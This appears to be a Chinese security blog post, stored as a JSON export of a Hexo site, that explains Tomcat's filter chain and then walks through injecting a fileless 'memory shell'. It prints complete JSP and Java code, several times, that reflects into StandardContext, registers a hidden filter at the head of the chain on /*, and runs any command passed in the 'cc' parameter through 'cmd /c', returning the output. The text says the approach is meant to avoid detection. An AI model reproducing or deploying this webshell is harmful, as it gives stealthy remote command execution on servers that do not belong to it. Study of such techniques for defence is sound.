程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。\n    ```\n    \n+   **FilterDef**\n    \n    ```auto\n    过滤器的配置和描述\n    ```\n    \n+   **ApplicationFilterChain**\n    \n    ```auto\n    调用过滤器链\n    ```\n    \n+   **ApplicationFilterConfig**\n    \n    ```auto\n    获取过滤器\n    ```\n    \n+   **ApplicationFilterFactory**\n    \n    ```auto\n    组装过滤器链\n    ```\n    \n+   **WebXml**\n    \n    ```auto\n    一个存放web.xml中内容的类\n    ```\n    \n+   **ContextConfig**\n    \n    ```auto\n    一个web应用的上下文配置类\n    ```\n    \n+   **StandardContext**\n    \n    ```auto\n    一个web应用上下文(Context接口)的标准实现\n    ```\n    \n+   **StandardWrapperValve**\n    \n    ```auto\n    一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。\n    \n    ```\n    \n\n### Tomcat Filter调用流程\n\n首先 `ContextConfig$configureContext` 对 `web.xml` 进行解析，获取到 `WebXml` 实例\n\n\n\n然后直接看到 `StandardWrapperValve` ，在这里将会完成过滤器的组装\n\n```auto\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n```\n\n看到这行代码，发现 `filterchain` 是由 `ApplicationFilterFactory$createFilterChain` 创建的，跟进该方法\n\n\n\n前面的代码主要是初始化 `filterchain` 变量，这里使用 `StandardWrapper$getParent` 获取当前 `Context` 也就是当前运行的WEB应用，然后使用 `Context` 的 `findFilterMaps` 获取到 `filterMaps`\n\n\n\n`filterMaps` 中存放了已定义的及自带的 `filterMap` ，而 `filterMap` 中存放了 filtername 及 url，然后看看 `filter` 的组装逻辑\n\n\n\n`for循环` 遍历 `filterMaps` ，如果当前请求的 `url` 和 `filterMap` 中的 `urlPatterns` 相同，就会调用 `findFilterConfig` 方法寻找对应 `filtername` 的 `FilterConfig` ，如果找到就调用 `addFilter` 方法将 `filterConfig` 加入到 `filterChain`\n\n跟进 `addFilter` 方法，该方法首先遍历 `filterChain` ，看看要添加的 `filter` 是否已经存在。如果存在就直接 `return`\n\n\n\n如果n等于 `filters` 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 `filters` 。至此 `filterChain` 也就组装完成了，接着回到 `StandardWrapperValve` 执行 `ApplicationFilterChain$doFilter`\n\n\n\n然后跟进 `doFilter` 方法\n\n\n\n调用了 `internalDoFilter` 方法\n\n\n\n先获取 `filterConfig` ，然后通过 `filterConfig.getFilter()` 获取到 `filter` ，再调用 `filter` 的 `doFilter` 方法，就结束了 Filter 的调用。\n\n总结一下流程\n\n+   先从当前 `Context` 中获取到 `filterMaps`\n+   筛选出 `urlPattern` 与当前请求 url 相符合的 `filtername`\n+   根据 `filtername` 找到对应的 `FilterConfig`\n+   将 `FilterConfig` 加入到 `filterChain`\n+   调用 `filterChain` 的 `internalDoFilter` 遍历获取 `FilterConfig`\n+   然后获取 `FiletrConfig` 对应的 `Filter` ，并调用 `Filter` 的 `doFilter`\n\n## filter内存马注入\n\n理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 `filter` 注入。\n\n回想一下 `filter` 的获取流程，可以发现 `filterMaps` 是从当前 `context` 中获取到的\n\n\n\n那如果我们可以对这个 `context` 中存储的 `filterMaps` 进行修改是不是就可以注入自己的恶意 `filter` 了。\n\n那么怎么修改呢，我们先看一下这个 `context` ， `StandardContext` 有三个关于 `filter` 的成员变量\n\n\n\n+   filterConfigs：存储 `filterConfig` 的 `HashMap` ， `filterConfig` 中又存储了 `FilterDef` 和 `filter` 对象\n+   filterDefs：存放 `FilterDef` 的 `HashMap` ，**FilterDef**中存储着过滤器名，过滤器实例，匹配的url 等\n+   filterMaps：存放 `FilterMap` 的 `HashMap` ， `FilterMap` 中主要存放了 `FilterName` 和对应的 `URLPattern`\n\n注入流程如下\n\n+   创建恶意 `filter`\n+   使用 `FilterDef` 封装恶意 `filter`\n+   将该 `FilterDef` 添加到 `FilterDefs` 和 `FilterConfig`\n+   建立恶意 `filter` 对应的 `filterMap` ，并将其加入到 `filterMaps` 中(将其放到最前面)\n\n大概代码\n\n```auto\n//创建filter\n        Filter filter=new Filter() {\n            @Override\n            public void init(FilterConfig filterConfig) throws ServletException {\n\n            }\n\n            @Override\n            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                HttpServletRequest req = (HttpServletRequest) servletRequest;\n                if (req.getParameter(\"cc\") != null){\n                    byte[] bytes = new byte[1024];\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n                    servletResponse.getWriter().write(new String(baos.toByteArray()));\n                    return;\n                }\n                filterChain.doFilter(servletRequest,servletResponse);\n            }\n\n            @Override\n            public void destroy() {\n\n            }\n        };\n\n        //封装filter\n        String filtername=\"novic4\";\n        FilterDef filterDef=new FilterDef();\n        filterDef.setFilter(filter);\n        filterDef.setFilterName(filtername);\n        filterDef.setFilterClass(filter.getClass().getName());\n\n        //将filterdef添加到filterdefs中\n        standardContext.addFilterDef(filterDef);\n\n        //将filterdef添加到filterconfig中\n        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n        constructor.setAccessible(true);\n        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n        //建立对应得filterMap\n        FilterMap filterMap = new FilterMap();\n        filterMap.addURLPattern(\"/*\");\n        filterMap.setFilterName(filtername);\n        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3\n        filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n        //插入filterMaps，将其插到首位\n        standardContext.addFilterMapBefore(filterMap);\n\n        //添加到filterconfigs\n        Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n        Configs.setAccessible(true);\n        Map filterConfigs = (Map) Configs.get(standardContext);\n        filterConfigs.put(filtername,filterConfig);\n```\n\n要想修改这个 `context` ，就需要先获取到该 `context`,已知有三种获取方式\n\n+   **将 `servletcontext` 转换成 `StandardContext`**\n    \n    ```auto\n    web容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用\n    ```\n    \n    ```auto\n    ServletContext servletContext = request.getSession().getServletContext();\n        Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n        appctx.setAccessible(true);\n            // ApplicationContext 为 ServletContext 的实现类\n        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n    \n        Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n        stdctx.setAccessible(true);\n        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    ```\n    \n+   ****通过Mbean获取context****\n    \n    ```auto\n    [https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)\n    ```\n    \n+   **从线程中获取StandardContext**\n    \n    ```auto\n    [https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)\n    \n    ```\n    \n\n这里使用第一种方式写一个内存马\n\n```auto\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.Map\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %>\n<%@ page import=\"java.lang.reflect.Constructor\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %>\n<%@ page import=\"org.apache.catalina.Context\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n\n<%\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //创建filter\n    Filter filter=new Filter() {\n        @Override\n        public void init(FilterConfig filterConfig) throws ServletException {\n\n        }\n\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n            HttpServletRequest req = (HttpServletRequest) servletRequest;\n            if (req.getParameter(\"cc\") != null){\n                byte[] bytes = new byte[1024];\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                servletResponse.getWriter().write(new String(baos.toByteArray()));\n                return;\n            }\n            filterChain.doFilter(servletRequest,servletResponse);\n        }\n\n        @Override\n        public void destroy() {\n\n        }\n    };\n\n    //封装filter\n    String filtername=\"novic4\";\n    FilterDef filterDef=new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(filtername);\n    filterDef.setFilterClass(filter.getClass().getName());\n\n    //将filterdef添加到filterdefs中\n    standardContext.addFilterDef(filterDef);\n\n    //将filterdef添加到filterconfig中\n    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n    //建立对应得filterMap\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(filtername);\n    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n    //插入filterMaps，将其插到首位\n    standardContext.addFilterMapBefore(filterMap);\n\n    //添加到filterconfigs\n    Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n    Configs.setAccessible(true);\n    Map filterConfigs = (Map) Configs.get(standardContext);\n    filterConfigs.put(filtername,filterConfig);\n    out.print(\"bingo\");\n%>\n```\n\n\n\n不过中文回显还是有点问题\n\n","source":"_posts/Tomcat内存马—Filter型.md","raw":"---\ntitle: Tomcat内存马—Filter型\ndate: 2023-06-11 23:42:29\nexcerpt: Tomcat内存马—Filter型\ncategories: 学习\n---\n\n\n\n## Filter\n\nFilter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 `web.xml`中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。\n\n\n\n从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。\n\n### 测试demo\n\n为了更好的理解Filter，写一个demo\n\ntestfilter.java\n\n```auto\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class testfilter implements Filter{\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println(\"filter初始化\");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"dofilter\");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n}\n```\n\nweb.xml\n\n```auto\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <filter>\n        <filter-name>testfilter</filter-name>\n        <filter-class>testfilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>testfilter</filter-name>\n        <url-pattern>/filter</url-pattern>\n    </filter-mapping>\n\n    <servlet>\n        <!--servlet名字，和类名一致-->\n        <servlet-name>test</servlet-name>\n        <!--class文件名，如果有包要加上包名-->\n        <servlet-class>test</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>test</servlet-name>\n        <!--url-->\n        <url-pattern>/test</url-pattern>\n    </servlet-mapping>\n</web-app>\n```\n\n然后访问一下 `/filter`\n\n\n\n成功触发过滤器\n\n### Filter相关类\n\nfrom [https://paper.seebug.org/1441/#tomcat](https://paper.seebug.org/1441/#tomcat)\n\n+   **Filter**\n    \n    ```auto\n    过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。\n    ```\n    \n+   **FilterChain**\n    \n    ```auto\n    过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain\n    ```\n    \n+   **FilterConfig**\n    \n    ```auto\n    过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。\n    ```\n    \n+   **FilterDef**\n    \n    ```auto\n    过滤器的配置和描述\n    ```\n    \n+   **ApplicationFilterChain**\n    \n    ```auto\n    调用过滤器链\n    ```\n    \n+   **ApplicationFilterConfig**\n    \n    ```auto\n    获取过滤器\n    ```\n    \n+   **ApplicationFilterFactory**\n    \n    ```auto\n    组装过滤器链\n    ```\n    \n+   **WebXml**\n    \n    ```auto\n    一个存放web.xml中内容的类\n    ```\n    \n+   **ContextConfig**\n    \n    ```auto\n    一个web应用的上下文配置类\n    ```\n    \n+   **StandardContext**\n    \n    ```auto\n    一个web应用上下文(Context接口)的标准实现\n    ```\n    \n+   **StandardWrapperValve**\n    \n    ```auto\n    一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。\n    \n    ```\n    \n\n### Tomcat Filter调用流程\n\n首先 `ContextConfig$configureContext` 对 `web.xml` 进行解析，获取到 `WebXml` 实例\n\n\n\n然后直接看到 `StandardWrapperValve` ，在这里将会完成过滤器的组装\n\n```auto\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n```\n\n看到这行代码，发现 `filterchain` 是由 `ApplicationFilterFactory$createFilterChain` 创建的，跟进该方法\n\n\n\n前面的代码主要是初始化 `filterchain` 变量，这里使用 `StandardWrapper$getParent` 获取当前 `Context` 也就是当前运行的WEB应用，然后使用 `Context` 的 `findFilterMaps` 获取到 `filterMaps`\n\n\n\n`filterMaps` 中存放了已定义的及自带的 `filterMap` ，而 `filterMap` 中存放了 filtername 及 url，然后看看 `filter` 的组装逻辑\n\n\n\n`for循环` 遍历 `filterMaps` ，如果当前请求的 `url` 和 `filterMap` 中的 `urlPatterns` 相同，就会调用 `findFilterConfig` 方法寻找对应 `filtername` 的 `FilterConfig` ，如果找到就调用 `addFilter` 方法将 `filterConfig` 加入到 `filterChain`\n\n跟进 `addFilter` 方法，该方法首先遍历 `filterChain` ，看看要添加的 `filter` 是否已经存在。如果存在就直接 `return`\n\n\n\n如果n等于 `filters` 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 `filters` 。至此 `filterChain` 也就组装完成了，接着回到 `StandardWrapperValve` 执行 `ApplicationFilterChain$doFilter`\n\n\n\n然后跟进 `doFilter` 方法\n\n\n\n调用了 `internalDoFilter` 方法\n\n\n\n先获取 `filterConfig` ，然后通过 `filterConfig.getFilter()` 获取到 `filter` ，再调用 `filter` 的 `doFilter` 方法，就结束了 Filter 的调用。\n\n总结一下流程\n\n+   先从当前 `Context` 中获取到 `filterMaps`\n+   筛选出 `urlPattern` 与当前请求 url 相符合的 `filtername`\n+   根据 `filtername` 找到对应的 `FilterConfig`\n+   将 `FilterConfig` 加入到 `filterChain`\n+   调用 `filterChain` 的 `internalDoFilter` 遍历获取 `FilterConfig`\n+   然后获取 `FiletrConfig` 对应的 `Filter` ，并调用 `Filter` 的 `doFilter`\n\n## filter内存马注入\n\n理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 `filter` 注入。\n\n回想一下 `filter` 的获取流程，可以发现 `filterMaps` 是从当前 `context` 中获取到的\n\n\n\n那如果我们可以对这个 `context` 中存储的 `filterMaps` 进行修改是不是就可以注入自己的恶意 `filter` 了。\n\n那么怎么修改呢，我们先看一下这个 `context` ， `StandardContext` 有三个关于 `filter` 的成员变量\n\n\n\n+   filterConfigs：存储 `filterConfig` 的 `HashMap` ， `filterConfig` 中又存储了 `FilterDef` 和 `filter` 对象\n+   filterDefs：存放 `FilterDef` 的 `HashMap` ，**FilterDef**中存储着过滤器名，过滤器实例，匹配的url 等\n+   filterMaps：存放 `FilterMap` 的 `HashMap` ， `FilterMap` 中主要存放了 `FilterName` 和对应的 `URLPattern`\n\n注入流程如下\n\n+   创建恶意 `filter`\n+   使用 `FilterDef` 封装恶意 `filter`\n+   将该 `FilterDef` 添加到 `FilterDefs` 和 `FilterConfig`\n+   建立恶意 `filter` 对应的 `filterMap` ，并将其加入到 `filterMaps` 中(将其放到最前面)\n\n大概代码\n\n```auto\n//创建filter\n        Filter filter=new Filter() {\n            @Override\n            public void init(FilterConfig filterConfig) throws ServletException {\n\n            }\n\n            @Override\n            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                HttpServletRequest req = (HttpServletRequest) servletRequest;\n                if (req.getParameter(\"cc\") != null){\n                    byte[] bytes = new byte[1024];\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n                    servletResponse.getWriter().write(new String(baos.toByteArray()));\n                    return;\n                }\n                filterChain.doFilter(servletRequest,servletResponse);\n            }\n\n            @Override\n            public void destroy() {\n\n            }\n        };\n\n        //封装filter\n        String filtername=\"novic4\";\n        FilterDef filterDef=new FilterDef();\n        filterDef.setFilter(filter);\n        filterDef.setFilterName(filtername);\n        filterDef.setFilterClass(filter.getClass().getName());\n\n        //将filterdef添加到filterdefs中\n        standardContext.addFilterDef(filterDef);\n\n        //将filterdef添加到filterconfig中\n        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n        constructor.setAccessible(true);\n        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n        //建立对应得filterMap\n        FilterMap filterMap = new FilterMap();\n        filterMap.addURLPattern(\"/*\");\n        filterMap.setFilterName(filtername);\n        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3\n        filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n        //插入filterMaps，将其插到首位\n        standardContext.addFilterMapBefore(filterMap);\n\n        //添加到filterconfigs\n        Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n        Configs.setAccessible(true);\n        Map filterConfigs = (Map) Configs.get(standardContext);\n        filterConfigs.put(filtername,filterConfig);\n```\n\n要想修改这个 `context` ，就需要先获取到该 `context`,已知有三种获取方式\n\n+   **将 `servletcontext` 转换成 `StandardContext`**\n    \n    ```auto\n    web容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用\n    ```\n    \n    ```auto\n    ServletContext servletContext = request.getSession().getServletContext();\n        Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n        appctx.setAccessible(true);\n            // ApplicationContext 为 ServletContext 的实现类\n        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n    \n        Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n        stdctx.setAccessible(true);\n        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    ```\n    \n+   ****通过Mbean获取context****\n    \n    ```auto\n    [https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)\n    ```\n    \n+   **从线程中获取StandardContext**\n    \n    ```auto\n    [https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)\n    \n    ```\n    \n\n这里使用第一种方式写一个内存马\n\n```auto\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.Map\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %>\n<%@ page import=\"java.lang.reflect.Constructor\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %>\n<%@ page import=\"org.apache.catalina.Context\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n\n<%\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //创建filter\n    Filter filter=new Filter() {\n        @Override\n        public void init(FilterConfig filterConfig) throws ServletException {\n\n        }\n\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n            HttpServletRequest req = (HttpServletRequest) servletRequest;\n            if (req.getParameter(\"cc\") != null){\n                byte[] bytes = new byte[1024];\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                servletResponse.getWriter().write(new String(baos.toByteArray()));\n                return;\n            }\n            filterChain.doFilter(servletRequest,servletResponse);\n        }\n\n        @Override\n        public void destroy() {\n\n        }\n    };\n\n    //封装filter\n    String filtername=\"novic4\";\n    FilterDef filterDef=new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(filtername);\n    filterDef.setFilterClass(filter.getClass().getName());\n\n    //将filterdef添加到filterdefs中\n    standardContext.addFilterDef(filterDef);\n\n    //将filterdef添加到filterconfig中\n    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n    //建立对应得filterMap\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(filtername);\n    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n    //插入filterMaps，将其插到首位\n    standardContext.addFilterMapBefore(filterMap);\n\n    //添加到filterconfigs\n    Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n    Configs.setAccessible(true);\n    Map filterConfigs = (Map) Configs.get(standardContext);\n    filterConfigs.put(filtername,filterConfig);\n    out.print(\"bingo\");\n%>\n```\n\n\n\n不过中文回显还是有点问题\n\n","slug":"Tomcat内存马—Filter型","published":1,"updated":"2024-04-17T08:43:01.339Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ir000dh776fvvd1xl7","content":"<h2 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h2><p>Filter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 <code>web.xml</code>中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。</p>\n<p>从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。</p>\n<h3 id=\"测试demo\"><a href=\"#测试demo\" class=\"headerlink\" title=\"测试demo\"></a>测试demo</h3><p>为了更好的理解Filter，写一个demo</p>\n<p>testfilter.java</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import javax.servlet.*;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class testfilter implements Filter&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;filter初始化&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;dofilter&quot;);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>web.xml</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class=\"line\">         version=&quot;4.0&quot;&gt;</span><br><span class=\"line\">    &lt;filter&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        